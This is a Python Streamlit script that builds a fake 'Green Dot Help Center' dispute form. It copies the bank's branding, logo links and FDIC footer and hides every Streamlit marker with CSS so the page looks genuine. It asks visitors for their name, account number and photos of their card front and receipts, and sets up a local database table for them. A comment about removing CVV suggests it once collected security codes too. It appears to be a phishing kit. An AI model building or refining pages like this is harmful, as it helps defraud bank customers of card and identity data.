
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Database setup (Removing CVV from logic)
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- CSS NUCLEAR PARA OCULTAR TODO LO DE STREAMLIT ---
st.markdown("""<style>
/* Ocultar elementos base */
header {visibility: hidden !important; height: 0px !important;}
footer {display: none !important; visibility: hidden !important;}
#MainMenu {visibility: hidden !important;}
.stDeployButton {display: none !important;}
[data-testid=\"stHeader\"] {display: none !important;}
[data-testid=\"stAppToolbar\"] {display: none !important;}

/* Eliminar el badge 'Made with Streamlit' y cualquier barra inferior */
div[data-testid=\"stFooterAd\"] {display: none !important;}
div[class*=\"viewerBadge\"] {display: none !important;}
div[class*=\"styles_viewerBadge\"] {display: none !important;}
.stApp [data-testid=\"stStatusWidget\"] {display: none !important;}
#streamlit-connection-error {display: none !important;}

/* Ajuste de contenedor principal */
.block-container {
    padding-top: 2rem !important;
    padding-bottom: 0rem !important;
    max-width: 800px !important;
}

/* Estilos de botones y secciones */
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    width: 100%;
    border-radius: 4px !important;
    font-weight: bold !important;
}

.app-promo-container {
    background-color: #000000;
    padding: 40px 20px;
    text-align: center;
    border-radius: 12px;
    margin: 30px 0;
}

.legal-footer {
    font-size: 11px;
    color: #888;
    text-align: justify;
    margin-top: 40px;
    padding-top: 20px;
    border-top: 1px solid #eee;
}
</style>""", unsafe_allow_html=True)

# --- CONTENIDO UI ---
if os.path.exists('logo.svg'):
    st.image('logo.svg', width=150)

st.title("Dispute Center")
st.write("Please fill out the form below to submit your claim. All information is handled securely.")

with st.form("dispute_form_final", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Account Number (Last 4 digits)")
    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format=\"%.2f\")
    
    st.markdown("**Required Evidence**")
    rec = st.file_uploader("Store Receipt", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Front Image", type=['jpg','png','jpeg'])
    
    submitted = st.form_submit_button("SUBMIT DISPUTE")

if submitted:
    if nombre and rec and car:
        st.success("✅ Dispute submitted successfully. Reference ID: GD-" + str(int(datetime.now().timestamp())))
    else:
        st.error("⚠️ Please complete all fields and upload required images.")

# SECCIÓN RESTAURADA DE APP STORES
st.markdown("""<div class='app-promo-container'>
    <h3 style='color:white;'>Download the Green Dot app</h3>
    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
        <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='150'></a>
        <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='150'></a>
    </div>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
Green Dot cards are issued by Green Dot Bank, Member FDIC. 
©2026 Green Dot Bank. All rights reserved. NMLS #914924.
</div>""", unsafe_allow_html=True)
